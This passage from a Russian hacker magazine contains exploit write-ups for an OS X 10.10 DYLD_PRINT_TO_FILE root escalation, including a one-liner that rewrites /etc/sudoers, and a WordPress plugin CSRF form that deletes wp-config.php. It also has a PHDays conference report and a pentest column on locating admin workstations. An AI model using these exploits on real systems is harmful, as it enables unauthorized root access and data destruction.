любые исполняемые файлы с битом SUID. Это опасно, так как позволяет от-
крыть или создать произвольный файл с владельцем root в любом месте фай-
ловой системы. К тому же открытый файл с логами никогда не закрывается,
поэтому файловый дескриптор становится доступным внутри процессов, соз-
данных с помощью SUID файлов. Это означает, что дочерние процессы таких
SUID тоже могут писать в произвольные файлы, принадлежащие пользователю
root, в любом месте файловой системы. Это позволяет легко повысить приви-
легии в OS X 10.10.x.
   Когда Apple изменила динамический код компоновщика для поддержки но-
вой переменной окружения DYLD_PRINT_TO_FILE, в функции _main из dyld поя-
вился следующий фрагмент. Из него видно, что значение переменной исполь-
зуется напрямую как имя файла для открытия или создания файла с логами.

const char* loggingPath = _simple_getenv(envp, "DYLD_PRINT_TO_FILE");
if ( loggingPath != NULL ) {
    int fd = open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if ( fd != -1 ) {
         sLogfile = fd;
        sLogToFile = true;
    }
    else {
        dyld::log(
            "dyld: could not open DYLD_PRINT_TO_FILE='%s', errno=%d\n",
           loggingPath, errno);
    }
}

Проблема этого кода заключается в том, что нет никаких проверок при добав-
лении новых переменных окружения. Как правило, по соображениям безопас-
ности динамический компоновщик должен отклонять все значения переменной
окружения, которые указывают на «запрещенные» файлы. Такая обработка ав-
томатически срабатывает при добавлении новой переменной окружения через
функцию processDyldEnvironmentVariable(). Однако, код для переменной
DYLD_PRINT_TO_FILE был добавлен напрямую в функцию _main, поэтому dyld
сводобно принимает значения DYLD_PRINT_TO_FILE, содержащие «запрещен-
ные» файлы (к примеру, с битом SUID).
   Apple исправила эту уязвимость в OS X 10.11, переместив код для DYLD_
PRINT_TO_FILE (и другой новой переменной окружения) в функцию process
DyldEnvironmentVariable(), в которой есть механизм защиты. Возможно,
это исправление получилось в ходе обычного рефакторинга. Если же это был
именно патч для устранения уязвимости, то мы видим пример того, что Apple
не разменивается на патчи для старой версии ОС в то время, когда новая про-
ходит публичный бета-тест.
   Протестировать, уязвима ли система к этой атаке, можно из командной
строки. Можно, к примеру, ввести следующую команду:

$ EDITOR=/usr/bin/true
    DYLD_PRINT_TO_FILE=/this_system_is_vulnerable crontab -e

После этого в корневой директории ОС появится файл this_system_is_
vulnerable. Проверяем:

$ ls / | grep vulnerable
this_system_is_vulnerable





Эксплоит позволил создать файл в корне системы OS X

Если файл есть, значит, система уязвима. Для его удаления понадобятся права
суперпользователя.

EXPLOIT
После того как мы увидели, что система уязвима, этот факт можно проэксплуати-
ровать и поднять свои права в ОС. Пока рассмотрим пример с созданием пустого
файла в произвольном месте системы. Наша уязвимость позволяет полностью
его контролировать из-за утечки файлового дескриптора в дочерние процессы
SUID бинарника, который был запущен. Мы можем снова это продемонстриро-
вать с помощью нескольких строк в командной строке:

$ DYLD_PRINT_TO_FILE=/this_system_is_vulnerable su <some_username>
Password:
bash-3.2$ ls -la /this_system_is_vulnerable
-rw-r--r--  1 root  wheel  0 Jul 21 17:22 /this_system_is_vulnerable
bash-3.2$ echo "Test 1" >&3
bash-3.2$ echo "Test 2" >&3
bash-3.2$ cat /this_system_is_vulnerable
Test 1
Test 2

Файловый дескриптор 3 связан с открытым лог-файлом и позволяет напрямую
писать в него из порожденного шелла. При этом неавторизованный пользова-
тель может добавлять данные в файл, который принадлежит администратору си-
стемы. Это может быть любой файл в системе, что позволяет с легкостью повы-
сить привилегии (в данном примере мы использовали su, который требует ввод
собственного пароля пользователя, но могли бы использовать трюк с crontab,
как в предыдущем примере).
  Мы показали, как можно добавить нужные данные в произвольный файл си-
стемы. При этом мы ограничены флагом O_APPEND, из-за которого файл нель-
зя перезаписать. Однако эта проблема не так страшна, как может показаться:
флаг O_APPEND для файлового дескриптора может отключить любой, кто его
контролирует. Для этого достаточно системного вызова fcntl(F_SETFL). Сле-
дующий код на языке C демонстрирует, как можно писать что угодно в любой
файл ОС:

int main(int argc, char **argv)
{
    int fd;
    char buffer[1024];
    /* отключение O_APPEND */
    fcntl(3, F_SETFL, 0);
    lseek(3, 0, SEEK_SET);
    strcpy(buffer, "anything - anything - anything");
    write(3, &buffer, strlen(buffer));

Если совместить этот код с примером, описанным выше, можно будет перепи-
сать любой файл в системе.
   Теперь, когда мы можем писать что угодно в любой файл, первой мыслью
стало переписать какой-нибудь исполняемый файл SUID собственным кодом
для создания шелла. Но есть одна проблема, информацию о которой можно
найти в системном руководстве к вызову write в OS X:
   «Если реальный пользователь не является администратором, то write() очи-
щает SUID-бит у файла. Это предотвращает проникновение в систему пользо-
вателя, который "захватил" записываемый SUID-файл, принадлежащий адми-
нистратору».
   Этот отрывок из руководства к функции write(2) звучит так, будто мы не смо-
жем использовать атаку и переписывать файлы администратора с SUID-битом.
Но не нужно верить руководству! На практике оказывается возможной переза-
пись произвольных файлов, в том числе исполняемых. Упрощение внутри ядра,
которое ввели в Apple, не срабатывает в нашем случае, потому что файл с ло-
гами открывается с помощью исполняемого SUID-файла, который принадле-
жит root. Следовательно, он полностью соответствует правам доступа. Таким
образом, процесс записи в файловой системе будет верить, что он выполняет-
ся с правами администратора и SUID-бит не удалится.
   Полный код эксплоита можно найти в статье его автора. Используй его на
свой страх и риск. В ходе его эксплуатации текущий пользователь получает
права администратора, и в системе появляется ещё один шелл с именем /usr/
bin/boomsh, чтобы облегчить доступ в будущем.
   Есть и упрощенная версия (автор — lsdhobo):

$ echo python -c '"import os;os.write(3, \"ALL ALL=(ALL) NOPASSWD:
ALL\")"'|DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;sudo su





Использование упрощенной версии для получения прав администратора OS X

TARGETS
OS X 10.10 - 10.10.4 (включая текущую бета-версию 10.10.5)

SOLUTION
Автор предлагает «месяцы ждать от Apple патча» (или OS X 10.11), либо устано-
вить утилиту SUIDGuard.


CSRF УЯЗВИМОСТЬ В ПЛАГИНЕ BUDDYPRESS ACTIVITY PLUS

 CVSSv2      5 (AV:N/AC:L/Au:N/C:N/I:P/A:C)
 Дата релиза:  8 Июля 2015
 Автор:        Tom Adams
 CVE:            нет

Исследователем Томом Адамсом из команды dxw была обнаружена необычная
CSRF-уязвимость в плагине BuddyPress Activity Plus. Этот плагин позволяет вла-
дельцам сайта на Wordpress вставлять видео и другие виды медиа в свою лен-
ту. Необычность этой уязвимости заключается в том, что, по сути, единственная
польза от нее — это возможность удалить любой файл в системе, к которому
есть доступ у PHP процесса.

EXPLOIT
Для атаки нужно создать страницу со следующим содержимым и «заставить» ав-
торизованного пользователя нажать кнопку:

<form method="POST" action="http://localhost/wp-admin/admin-ajax.php">
    <input type="text" name="action" value="bpfb_remove_temp_images">
    <input type="text" name="data"
        value="bpfb_photos[]=../../../../wp-config.php">
    <input type="submit">
</form>

Далее масштабы атаки будут зависеть от полномочий PHP-пользователя на сер-
вере. Идентичная атака возможна, если установлен плагин BP Group Documents.
Для этого нужно заменить bpfb_remove_temp_images на bpfb_remove_temp_
documents и bpfb_photos на bpfb_documents.

TARGETS
BuddyPress Activity Plus 1.5

SOLUTION
Есть исправление от производителя.
Взлом
PHDAYS V.
РАПОРТУЕМ О БАГАХ

   ЧЕСТНЫЙ ОТЧЕТ ОБ ОДНОЙ ИЗ САМЫХ
     ИЗВЕСТНЫХ КОНФЕРЕНЦИЙ ПО IT
       БЕЗОПАСНОСТИ В РОССИИ





                                         Трегубенко Владимир
                                                     tregubenko_v_v@tut.by





26 и 27 мая 2015 года в московском Центре международной торговли прошел
пятый по счету Positive Hack Days. Слоган конференции, «точка сингулярности»,
что называется, выстрелил, но отнюдь не в хорошем смысле. Кому-то эти сло-
ва покажутся чересчур резкими, но факт — конференция получилась не торт.
С одной стороны было, конечно, много интересного и нового. С другой — не-
мало недочетов. Причем те, кто пришли на конференцию в первый раз, этого
и не заметили, но старожилам это сильно бросилось в глаза.
  В этом году случилось страшное: по форуму ударила политика и экономика.
Многие компании были вынуждены «затянуть пояса», что означало снижение
финансирования отдельных направлений. Естественно, это сказалось и на про-
ведении PHDays. Другой фактор — много участников из-за рубежа не смогли
приехать на PHDays из-за «негласного идеологического» давления со стороны
своего руководства: большинство white hat работают на крупных вендоров, ко-
торые теперь не приветствуют посещение России. И это печально.
   Давайте вкратце остановимся на ключевых моментах форума.


Традиционные «пиджаки» и «футболки».
Еще час назад тут было жарко





НАС REBOOT, А МЫ КРЕПЧАЕМ
Емкая фраза из названия открывающей секции PHDays отлично характеризу-
ет ситуацию в российском IT сегменте. Отдельные цитаты от власть имущих
реально доставили, например: «нас не волнует бизнес, мы должны думать про
государственную безопасность». Вообще, было заявлено, что «мы открыты
для диалога», но в конце секции сложилось впечатление, что никакого диалога
реально нет. Куча регуляторов, куча противоречий в нормативке и отсутствие
вменяемой координации в действиях — вот настоящие реалии.
   Ну и конечно же, очередное «ругательное» слово — импортозамещение.
Особенно магическое значение этого слова чувствовалось по рекламным
стендам — Kaspersky, ONsec, Wallarm, Solar Security, Qiwi... Ничего не замети-
ли? Так точно — только отечественные производители =)
  С импортозамещением связано и другое «ругательное» слово — SIEM. Это
система для противодействия угрозам класса APT (среди прочих своих функ-
ций). В пику лидерам — ArcSight ESM, QRadar SIEM, McAfee ESM — Kaspersky,
InfoWatch и Positive Technologies начали раскручивать свои системы SIEM. Осо-
бенно выделился PT: презентация их нового комплекса MaxPatrol X, который,
по сути, является продуктом а-ля «делали новый сканнер, а получился SIEM»,
впечатлила многих. MaxPatrol X должен получиться крутым.

Что такое SIEM?

Security Information and Event Management (SIEM) — это, вообще говоря, симби-
оз двух аббревиатур:

1. SIM (Security information management) — управление информационной без-
   опасностью;
2. SEM (Security event management) — управление событиями безопасности.

Говоря простым языком, SIEM на входе получает некоторый набор информа-
ции о различных событиях в сети. Это могут быть системные логи, отчеты ра-
боты антивирусов и файрволов, журналы аудита доступа, логи веб серверов
и приложений, данные анализаторов уязвимостей компьютеров в сети и дру-
гие источники.
   Полученные данные сохраняются в каком-либо хранилище и на основе этих
данных по хитрым алгоритмам производится вычисление корреляции собы-
тий между собой. На основании этих вычислений производится оповещение
ответственных лиц о том, что, вероятно, произошел некий инцидент. Именно
системы SIEM сейчас продвигаются в качестве панацеи от атак класса APT,
поскольку стало очевидно, что антивирусная защита от APT не спасает никак.



ТРЕНДЫ
Ряд докладов обозначил некоторые ключевые проблемные места в безопас-
ности IT.
   Одним из самых интересных получился доклад «Социальная инженерия
в шутку и всерьез» от Криса Хаднаги. Видно, что человек умеет замечательно
подать материал. Ключевая фраза: «пока вы годами ищете всякие zeroday, мы
просто поднимаем трубку телефона и узнаем пароль». Это действительно про-
блема: социальная инженерия работает, ведь технологии меняются, но не ме-
няются люди. Защите в этой области явно не хватает внимания. Попутно спи-
кер является соавтором конкурса Social Engeneering CTF для DEFCON.
   Смежные с социнженерией вопросы поднимались и в докладе Штефана
Шумахера «Почему же с инфобезом все плохо» (на английском презентация
называлась гораздо красноречивее: «Why IT security is fucked up»). Причина все
та же — люди. Основной месседж Штефана — IT начинает очень сильно вли-
ять на социум, а подавляющее количество людей не понимает, как все это ра-
ботает и к чему приводит.


                                      Пытаемся хакнуть
                                       терминал QIWI.
                                  К терминалу можно
                                     было подключать
                                       физические
                                          устройства





И у робота из мониторов есть сердце

   На взгляд Штефана, необходима глубокая проработка этой темы с привле-
чением социологии и психологии. В частности, все эти страшные слова типа
«хакеры», «кибервойна», «социальная инженерия» — у всех на слуху, но те, кто
их использует (включая политиков), имеют весьма поверхностное представле-
ние о теме. А бороться с проблемами, не понимая их сути — бессмысленно.
   Традиционная аналитика от PT принесла много не совсем хороших ново-
стей. Во многих компаниях творится «бардак» и «разруха в головах». Это ка-
сается защиты внешнего периметра: многие считюат, что с этим у них все ОК,
однако практика показывает обратное. Главной проблемой внутри периметра
является отсутствие видения своей инфраструктуры глазами злоумышленни-
ка. Хорошие новости: сегодня уже отчетливо виден тренд разворота от «бу-
мажной» безопасности (сертификация) к безопасности реальной (пентестинг).
   К слову, количество векторов атак непрерывно растет. Взять, например,
мобильную связь. Инфраструктура мобильных операторов сегодня достаточ-
но уязвима. Многие GSM-гейты смотрят «наружу», и в этом легко убедиться,
поискав в SHODAN системы по запросу «GGSN» (многие из них, конечно, яв-
ляются honeypot, но все же).


Доклад о
файловой системе
суперкомпьютеров





   Большую опасность также представляют уязвимости протокола SS7: факти-
чески любой, кто сможет зарегистрироваться в качестве виртуального мобиль-
ного оператора, получает доступ к магистральным каналам связи (к которым
подключены все мобильные операторы) и может проводить соответствующие
атаки. Например, прослушку абонентов, находящихся даже на другом конце
земного шара.
  3G модемы и Wi-Fi-роутеры также подливают масла в огонь. Web-интерфей-
сы этих устройств кишат многочисленным уязвимостями (не считая дефолтных
паролей), что позволяет скомпрометировать их, изменить DNS настройки и пе-
рехватить трафик пользователя. В самом запущенном случае — можно даже
скомпрометировать пользовательский компьютер. Факт появления большого
количества червей под ADSL-модемы это подтверждает.
   Про 3G модемы, кстати, был отдельный короткий спич «Буткит через СМС:
оценка безопасности 4G-сетей» (докладывали Кирилл Нестеров, Тимур Юну-
сов и Алексей Осипов).


Известный
криптограф
Уитфилд Диффи





Не лучше обстоят дела и с банкоматами. Две самые «отличившиеся» страны,
где банкоматы чаще всего доступы из интернета (!) — Пакистан (1458) и Рос-
сия (571). А стоит в банкомате, как правило, Windows XP, иногда даже SP2.
   Ну и про SCADA. Реакция вендоров и заказчиков просто удручает. Срок вы-
пуска патча раз в полгода — в порядке вещей. И когда еще заказчик этот патч
установит, тоже неизвестно. Ну и то, что SCADA тоже «светятся» в Интернете,
уже никого не удивляет. Вот и получается, что волна исследований уязвимо-
стей SCADA, начавшаяся в 2010 году, так и не привела к значительному повы-
шению уровня безопасности.
   Главный же сдвиг в построении защиты — это осознание того факта, что
выстроить защиту «от всего» невозможно в принципе. Поэтому на первый план
выходит идея максимально быстрого обнаружения инцидента и нейтрализа-
ция последствий, причем полгода нахождения злоумышленников в защищае-
мом периметре, по нынешним меркам — это довольно-таки быстро, учитывая
последние тенденции по выявлению всяких APT, не обнаруживаемых годами.


Создание
международного
сообщества
«белых шляп»





ВСЕ, ЧТО ВЫ ХОТЕЛИ УСЛЫШАТЬ, НО НЕ УСЛЫШАЛИ
Доклад «Алгоритмы DGA и обнаружение киберугроз» от Джона Бамбенека
по названию обещал быть интересным, а по факту просто оказался описани-
ем почти всех методов повышения устойчивости командных серверов ботне-
тов к воздействию со стороны правоохранительных органов и антивирусных
компаний. Ну и фраза, что обнаружение в корпоративных сетях DGA трафи-
ка — это очень важно для безопасности (прямо капитан очевидность). А мно-
гие бы хотели услышать про размещение адресов C&C на сайтах типа Twitter,
Facebook, GitHub и т.п. Интересно, как с этим сейчас борются.
   Или вот вообще идея на поверхности — продемонстрировать софт, кото-
рый обнаруживает DGA трафик (например, по наличию большого количества
специфических DNS запросов) и вычислить малварь на конечных компьюте-
рах, а то и вовсе блокировать без всякого реверс-инженеринга.





Атака на
банкомат


Специалисты Лаборатории Касперского удивили: в этом году не было ника-
ких разборов троянов с «громкими именами». Был доклад «Где заканчивается
анонимность в анонимных сетях» от Дениса Макрушина и Марии Гарнаевой
про fingerprint пользователей TOR. Я ожидал, что наконец-то нам расскажут,
как ЛК, таким образом, поспособствовала в поимке каких-нибудь злоумыш-
ленников, пусть даже и без фамилий. Но нет, ничего такого не рассказали.
  Еще один «технический» доклад — «Исследование правительственных
шпионских программ» с участием Александра Гостева и Виталия Камлюка.
Вы думали, что это — обзор последних вредоносов, используемых в атаках
класса APT и трендах их развития? А вот и не угадали, вместо этого состоял-
ся довольно невнятный диалог, в котором Виталий играл роль представителя
разработчиков malware, «разрабатываемой при поддержке какого-либо госу-
дарства». Ну а Александр выступал от имени «рыцарей в белых плащах».
   Доклад «Рынок эксплойтов нулевого дня: шантаж и товарищество» от Аль-
фонсо де Грегорио оказался вариацией «дилеммы заключенного» из теории
игр. Сплошная математика (хотя заголовок впечатляющий), а нам бы про Vupen
послушать и других участников рынка. Хоть цены бы озвучили :).
   Видеомост с Уитфилдом Диффи быстро превратился из обсуждения темы
в «поток сознания». Вероятно, совсем немногие способны понять, о чем бес-
покоится великий гуру ассиметричного шифрования. А возможно, понимание
усугублялось переводом в стиле Володарского :). Но главная идея все же ясна:
безопасность информации тотально недофинансирована, и тут с гуру не по-
споришь.


До финала CTF пара часов





Российские реалии повлияли и на Андрея Масаловича, спикера-ветерана, ко-
торый выступал на каждой PHDays. На доклад «Никаких оттенков серого» был
выделен всего час (хотя после выступления публика потребовала продолже-
ния, и это вылилось в дополнительные полчаса), и многие отметили, что со-
держание получилось несколько политизированным. Слово «Украина» про-
скакивало достаточно часто. Это и неудивительно, ведь тема доклада очень
актуальна: борьба с дезинформацией.

СТЕНДЫ, CTF И ВСЕ, ВСЕ, ВСЕ...
Очень хочется похвалить PHDays V за CTF и конкурсы. В этом году конкурсная
программа CTF проходила на территории придуманного государства — United
States of Soviet Unions (USSU). Очки за конкурсы зачислялись в виде вымыш-
ленной валюты. Очень впечатлили идеи про биржу, продажу описаний уязви-
мостей в местный аналог CERT, black market уязвимостей и взлом информа-
ционных агентств для спекуляций на бирже. К тому же стенды, которые ранее
были обособленными конкурсами для гостей, теперь стали частью CTF. Среди
них — взлом банкомата, компрометация GSM сети, перенастройка протоко-
лов маршрутизации сетевых устройств, эксплуатация систем SCADA и взлом
оборудования виртуальной электрической подстанции.


Атакуем систему
автоматизации
транспортной
безопасности





Кстати, много интересного по поводу конкурсов и не только можно прочитать
в блоге компании Positive Technologies на Хабре. Нужно отметить, что для каж-
дого конкурса проводился отдельный мастер-класс, которые не снимались
на видео. Увидеть мастер-классы можно только непосредственно на конфе-
ренции. А дается на них действительно интересная информация!
   Конкурс по взлому GSM сети проводился впервые (как и по взлому марш-
рутизаторов и электроподстанции). Задания были интересные, хотя нужно от-
метить, что шифрование A5 было выключено, и это позволило активно сни-
фать трафик. Некоторые обратили внимание организаторов, что в реальных
условиях это не будет работать как раз из-за шифрования. PT ответила «вызов
принят» :) Вообще, с точки зрения получения знаний (как вся эта GSM-кухня
работает) модель сотовой сети была просто отличная.
   Стенды со SCADA-системами порадовали своей визуализацией. Одно
из заданий по взлому электрической подстанции должно было, по задумке,
завершиться эффектным перегоранием проводов на установленной рядом
имитации двух опор воздушной линии электропередач. К сожалению, до этого
этапа никто не дошел.



Зачем хакеры атакуют Олимпиаду?





Еще одна из систем SCADA (кроме уже ставших привычными моделей желез-
ной дороги и башенного крана) имитировала промышленную систему управ-
ления, связанную с ракетной установкой. Участники конкурса должны были по-
лучить доступ к системе управления, развернуть установку в сторону мишени
и произвести выстрел по «секретному объекту». Но и тут «выстрела Авроры»
не произошло. Неплохая, видимо, у нее защита.
   Инициаторы конкурсов по итогам отметили, что основным препятствием
в их успешном прохождении является слабое знание предметной области —
естественно, ведь оборудование и софт для банкоматов, SCADA и GSM не ва-
ляется на каждом углу (равно как и способы, приемы и методы их взлома).
Но заинтересованность в нужных кругах конкурсы вызвали, в том числе у ру-
ководителей, которые даже немножко опешили, глядя «как это все делается»
воочию.



 Андрей Масалович —
 никаких оттенков серого





Немножко о CTF. По ряду причин, о которых говорилось выше, в этом году на CTF
сражались почти исключительно российские команды. Только две из них были
из-за рубежа: команды Южной Кореи и Украины. Тройка призеров выглядела
следующим образом:
3. ReallyNonamesFor (Россия);
4. BalalaikaCr3w (Россия);
5. More Smoked Leet Chicken (Россия).

Вор у вора дубинку украл

Интересный факт: команда RDot (Россия) сумела найти и проэксплуатиро-
вать больше всех уязвимостей в различных конкурсах, однако ей не удалось
защитить украденные в ходе «взлома» системы ДБО деньги. Их «похитили»
ребята из команды More Smoked Leet Chicken при помощи банального ARP
спуффинга :).
   Защита от такой атаки была реализована организаторами, но, как это бы-
вает, что-то пошло не так (а конкретно — из-за большого количества потоков
сетевой девайс Cisco перешел в режим хаба). Получилось как в пословице:
«вор у вора дубинку украл». Ход хитроумный, и правилами это не было запре-
щено, но организаторы все же обещали пересмотреть правила для таких не-
ординарных случаев.



SHOW MUST GO ON
Если абстрагироваться от негативных моментов вроде недостатка финанси-
рования и отсутствия многих иностранных участников, хочется задать вопрос:
что будет дальше, с форматом конференции? Стало уже традицией противо-
поставлять ZeroNghts и PHdays: если первая — это хардкор и космос, то вто-
рая — это конференция не столько техническая, сколько про все аспекты ИБ:
физическую безопасность, действия государства в качестве регуляторов и т.д.
Подобных технических конференций — и так кот наплакал, а тут еще и PHdays
в плане докладов начинает плавно скатываться в сторону. Половина — вен-
доры/интеграторы/регуляторы, другая половина — гики/эникейщики, хакеры
остались в подавляющем меньшинстве. Не всем это по душе. Кто-то написал
в Twitter: «пятая конференция запомнится, как первая PHDays — без хакеров
и воды». Причем воды в буквальном смысле: в некоторых докладах и секциях
«воды» хватало, а вот с напитками все было плохо, читай — никак.


Конкурс
«Наливайка» —
на столе лайм и Текила.
После каждой неудачи
приходится пить





К слову сказать, все материалы от самой PT выглядели достойно.
  В который раз удивляет подход к функционированию Wi-Fi. Первую поло-
вину первого дня сеть просто лежала, так как пропускной способности явно
не хватало. Ровно такая же ситуация была и на PHDays III, которая проводилась
тоже в WTC (нет никакой причины полагать, что это были происки многочислен-
ных Man-in-the-Middle, в Digital October все работало более-менее нормально).
   Но, несмотря на всю критику, конференцию нельзя назвать неудавшейся.
Или, тем более, неинтересной. Многие участники, впервые посетившие меро-
приятия, остались в восторге; особенно те, кто хотел на практике попробовать
поломать мобильную сеть, SCADA систему или банкомат. Другой вопрос, что
только на этом компоненте конференции далеко не уедешь. К вопросу отбора
материала докладов, и главное — их подачи, организаторам стоит подходить
немного тщательнее.





   Хочется надеяться, что в следующем году PHDays сумеет реабилитиро-
ваться и показать всем достойный уровень организации и содержания кон-
тента, что бы запомниться, как отличное шоу для хакеров и не только, ведь шоу,
как известно, должно продолжаться...


Лучшие хакеры
на одной сцене
Взлом

Колонка Юрия Гольцева
В ПОИСКАХ
АДМИНИСТРАТОРА
                       Юрий Гольцев
                                           Профессиональный whitehat,
                                              специалист по иб, еженедельно
                                          проводящий множество этичных
                                             взломов крупных организаций,
                                              редактор рубрики взлом, почетный
                                               член команды     .
                                         @Ygoltsev



  Тестирование на проникновение (penetration
   testing) — метод оценки безопасности компьютерных
  систем или сетей средствами моделирования атаки
  злоумышленника. Для кого-то это хобби, для кого-то
   работа, для кого-то это стиль жизни. На страницах
  нашего журнала мы постараемся познакомить тебя
  с профессией настоящего этичного хакера, с зада-
   чами, которые перед ним ставятся, и их решениями.





INTRO
Одна из типичных задач для пентестера — это поиск десктопных машин кон-
кретных пользователей в сети. Уверен, ты понял, что речь идет не о простых
пользователях. Как пентестеров нас интересует верхушка корпоративной ие-
рархии: топ-менеджмент, представители отдела ИТ и другие лица, которые
обладают правами в корпоративной или технологической плоскости тестиру-
емой компании.
  В большинстве случаев доступ к целевым хостам таких пользователей не-
обходим для получения более глубокой информации об инфраструктуре или
же для демонстрации достигнутых рубежей доступа к корпоративной тайне.
Сегодня я расскажу об основных методах и средствах, которые помогают ре-
шить эту, казалось бы, тривиальную задачу в рамках пентеста среднестати-
стической корпоративной сети на базе Microsoft Active Directory.

CURRENT MODE
В большинстве случаев задача решается только по факту расширения приви-
легий до администратора домена. Когда требуется получить доступ к управле-
нию сетевым оборудованием, самый простой способ — найти администрато-
ра, который за него отвечает. Попав на его десктопную машину, с вероятностью
80% ты сразу получаешь все данные, которые необходимы для управления се-
тевыми устройствами.
   Имена компьютеров в сети обычно обезличены в целях безопасности и уни-
кальности каждого из хостнеймов (например, 7F1EKHGTE.corp.domain). Но ино-
гда «случайный» набор символов в хостнейме далеко не случайный, а вполне
осмысленный. Это помогает пентестеру сузить диапазон поиска хоста в рам-
ках департамента.
   Куда интереснее способ поиска компьютера пользователя при условии,
что имя хоста никак не связано с именем человека. Вот ряд утилит, которые
могут помочь в решении этой задачи. Для многих из них необходима учетная
запись администратора. Впрочем, без прав администратора домена все рав-
но не подобраться к десктопу топ-менеджера (по крайней мере, так бывает
примерно в 90% случаев).

PsLoggedon (SysInternals)
bit.ly/1fzvLf9
Официальная утилита производства Microsoft, идет в составе SysInternals, что
не может не радовать. Ни один антивирус не заподозрит бинарник в чем-то
противоестественном. Получает список залогиненых пользователей из рее-
стра через вызов API NetSessionEnum. Требует привилегии администратора
на хосте, в отношении которого производятся действия. К сожалению, тул-
зе нельзя указать подсеть в качестве цели, так что тебе придется прибегнуть
к магии консоли.





PsLoggedon в действии

NetSess
bit.ly/1LNdfOr
Проверенная временем (0ld sch00l) утилита. Так же как и PsLoggedon, исполь-
зует вызов API NetSessionEnum, чтобы получить список пользователей, залоги-
ненных на удаленном хосте. Не требует админских привилегий. К сожалению,
не умеет работать с подсетями — придется учить. Некто Scott Sutherland под-
готовил отличный скрипт-надстройку для netsess.exe c говорящим названием
Get Domain Admins.

PVEFindADUser
bit.ly/1MslOx9
Небольшая утилита, разработанная @corelanc0d3r, полностью удовлетворяет
нашим потребностям. В сущности, вывод этой утилиты один из наиболее ин-
формативных. Требует прав администратора на узлах, с которыми работает.

                                                                PVEFindADUser





netview
bit.ly/1fzCohx
Отличная тулза авторства @mubix. Позволяет энумерейтить не только залоги-
ненных в систему пользователей, но и сессии пользователей и общие ресурсы.
Может быть использована как с привилегиями администратора, так и без них.

                                                                        netview





NMap
bit.ly/1S7fTSK
Скрипты NMap тоже помогут в поиске залогиненных пользователей — к при-
меру, скрипт smb-enum-sessions.nse. Но для их работы понадобится как мини-
мум валидный доменный или локальный аккаунт, заведенный на ряде узлов.

X-Originating-IP
Не совсем юзабельный способ — он подразумевает работу с заголовками
электронных писем, к которым имеется доступ. Заголовок X-Originating-IP
поможет понять, с какой именно машины было отправлено письмо. В боль-
шинстве случаев это приведет тебя к искомой системе.

Veil-Pillage
bit.ly/1MsnaIc
Многофункциональный фреймворк постэксплуатационной направленности.
Особенно важны его модули user_hunter и group_hunter. Они предоставляют
информацию на основе вывода tasklist и qwinsta. В качестве аналога можно
использовать psexec_command, который входит в состав Metasploit. Для работы
необходимы привилегии администратора.

Информация из Active Directory
Свойство homeDirectory учетной записи может содержать путь до домашней
директории, которая автоматически монтируется при логине. Если значение
выставлено, это поможет тебе выявить серверы, к которым подключен поль-
зователь. После этого уже не составит труда узнать, с какого именно хоста
заходит жертва. Помимо этого, рекомендую обратить внимание на значение
profilePath, в котором тоже могут найтись полезные адреса. Для доступа к ин-
формации необходимо обладать доменной учетной записью.

PowerView (PowerTools)
bit.ly/1S7IuaB
Полезный набор скриптов PowerShell. Они автоматизирует действия, которые
помогают в разведке. Наибольший интерес представляют модули Invoke-
UserHunter и Invoke-StealthUserHunter. Первый вызывает  API функций
NetSessionEnum и NetWkstaUserEnum для каждого сервера. Второй модуль по-
могает извлечь данные из LDAP, однако NetSessionEnum срабатывает только
для серверов, адреса которых получены из user.HomeDirectories. Админи-
стративные привилегии для выполнения большинства функций не требуются.

OUTRO
Не стоит забывать о нестандартных решениях, которыми пользуются адми-
нистраторы систем для отслеживания логинов пользователей. Встречают-
ся самопальные SIEM системы и хитрые логон-скрипты, которые при запуске
на клиентской машине добавляют строку в текстовый файл и сохраняют ин-
формацию о том, что пользователь Х залогинился на сервер Y.
   Приведенные в статье утилиты применимы и результативны в 99% случаев.
Однако, если перед тобой большая сеть (например, /16) и нет абсолютно ника-
ких идей о том, в какую сторону копать, время выполнения того же PsLoggedOn
оставляет желать лучшего.
  В общем, желаю тебе удачного поиска. Stay tuned!

ПОЛЕЗНАЯ ИНФОРМАЦИЯ

Ссылки к материалу
• V5 Ways to Find Systems Running Domain Admin Processes
•  Faster Domain Escalation using LDAP
• @harmj0y's "security at the misfortune of others"

Общая теория по пентестам
•  Vulnerability Assessment
• Open Source Security Testing Methodology Manual
• The Penetration Testing Execution Standard

Немного практики
•  PentesterLab
•  Penetration Testing Practice Lab

Немного практики
• Open Penetration Testing Bookmarks Collection
Взлом



              РАСШИФРОВЫВАЕМ
                 TLS-ТРАФИК
              С ПОМОЩЬЮ JVMЛОГ
ВСЕМОГУЩИЙ





                                         Владимир



Совершая платеж в интернет-магазине или ином финан-
совом сервисе, ты наверняка инициируешь SSL-соедине-
ния где-то на серверной стороне с участием какого-ни-
будь Java-приложения. А теперь представь: что, если тебе
нужно исследовать это соединение? В силу бизнесовой
ценности его нельзя сделать открытым даже в тестовом
окружении. Устроить MITM с помощью Fiddler’а не даст
привязка к настоящим сертификатам, и даже если ты раз-
добудешь приватный ключ сервера, успех не гарантиро-
ван. Тупик? Оказывается, нет! Трафик такого приложе-
ния можно расшифровать, если у тебя есть его перехват
Wireshark’ом и… логи JVM.

ТЕОРИЯ
Чтобы ухватить суть этого концепта, удели пару минут постижению его основ.
Здесь будет рассказано, откуда и зачем берутся отладочные записи JVM, что
такое сессионные ключи SSL и как все это смешать в Wireshark’е так, чтобы
вскрыть зашифрованный трафик. Если какие-то из этих пунктов тебе уже из-
вестны, смело забивай на них и переходи дальше. Единственное, о чем здесь
не пойдет речь, это как пользоваться Wireshark’ом — наверняка ты и сам мо-
жешь научить этому кого угодно.

ОТЛАДОЧНЫЕ ЗАПИСИ JVM
Ни для кого не секрет, что настройка и отладка защищенных соединений — за-
дача отнюдь не тривиальная. Об этом догадывались и разработчики расшире-
ния JSSE для Java (реализация SSL/TLS), и поэтому любезно предусмотрели
в нем возможность писать в стандартный вывод (будь то консоль или файл) не-
которую информацию, которая может помочь в решении возможных проблем
с соединениями (по сути, это данные, на которых строятся защищенные сое-
динения) .
   «Спровоцировать» вывод этой информации можно при помощи специаль-
ного аргумента при запуске JVM: javax.net.debug. Он может иметь разные
значения в зависимости от того, что нужно вывести в лог, и JVM может сама под-
сказать, какие значения поддерживаются. Для того чтобы получить подсказку,
нужно придать аргументу значение help (то есть java -Djavax.net.debug=help
MyApp) и запустить приложение, использующее SSL (при этом само приложе-
ние не заработает, так как JVM завершится сразу после вывода справки):

all            turn on all debugging
